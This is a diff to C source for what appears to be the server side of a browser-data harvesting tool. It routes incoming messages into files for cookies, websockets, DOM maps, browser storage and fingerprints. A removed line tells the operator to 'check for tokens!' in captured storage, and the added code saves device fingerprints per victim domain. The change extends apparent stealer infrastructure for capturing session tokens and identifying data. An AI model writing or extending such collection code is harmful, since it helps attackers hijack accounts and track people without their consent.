@@ -20,6 +20,8 @@
 #define COOKIES_FILE   "data\\cookies.jsonl"
 #define WS_FILE        "data\\websockets.jsonl"
 #define DOMMAP_FILE    "data\\dommaps.jsonl"
+#define STORAGE_FILE   "data\\storage.jsonl"
+#define FINGERPRINT_FILE "data\\fingerprints.jsonl"
 #define MAX_MSG        (5 * 1024 * 1024)
 #define MAX_CLIENTS    4
 
@@ -182,8 +184,15 @@ void route_message(const char *msg) {
         broadcast_to_cli(line); write_log(line);
     }
     else if (strcmp(type, "storage") == 0) {
-        save_to_file(AUTH_FILE, msg);
-        broadcast_to_cli("[STORAGE] Saved to auth.jsonl — check for tokens!");
+        save_to_file(STORAGE_FILE, msg);
+        broadcast_to_cli("[STORAGE] Saved to storage.jsonl");
+    }
+    else if (strcmp(type, "fingerprint") == 0) {
+        save_to_file(FINGERPRINT_FILE, msg);
+        char dom[128], line[300];
+        json_get_str(msg, "domain", dom, sizeof(dom));
+        snprintf(line, sizeof(line), "[FINGERPRINT] captured @ %s", dom);
+        broadcast_to_cli(line); write_log(line);
     }
     else if (strcmp(type, "html") == 0) {
         char path[256];
